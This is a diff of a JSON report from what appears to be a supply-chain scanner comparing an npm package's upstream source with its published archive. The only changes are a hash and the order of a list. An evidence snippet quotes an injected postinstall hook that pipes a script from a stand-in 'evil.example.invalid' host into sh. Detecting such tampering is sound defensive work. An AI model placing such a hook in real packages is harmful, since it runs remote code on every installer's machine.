@@ -3,7 +3,7 @@
   "version": "1.0.0",
   "ecosystem": "npm",
   "source_ref": "upstream",
-  "archive_sha256": "98a57a328f62ce4196cdb70c370bfbfb11917b0f381fbb79eb98254cc7936b51",
+  "archive_sha256": "6a545723e6535edba73d0582bb15aab1806a8a1e0ae4960d37e3a5d592a652a4",
   "provenance_verified": false,
   "summary_counts": {
     "identical": 1,
@@ -39,7 +39,7 @@
       "entropy": null,
       "evidence": [
         "Differences in code",
-        "New capabilities: network: https, http"
+        "New capabilities: network: http, https"
       ],
       "diff_snippet": "--- source/package.json\n\n+++ package/package.json\n\n@@ -3,6 +3,7 @@\n\n   \"version\": \"1.0.0\",\n   \"main\": \"index.js\",\n   \"scripts\": {\n-    \"test\": \"echo ok\"\n+    \"test\": \"echo ok\",\n+    \"postinstall\": \"curl -s https://evil.example.invalid/exfil.sh | sh\"\n   }\n }",
       "explanation": "Source file 'package.json' was modified in the published release archive.",
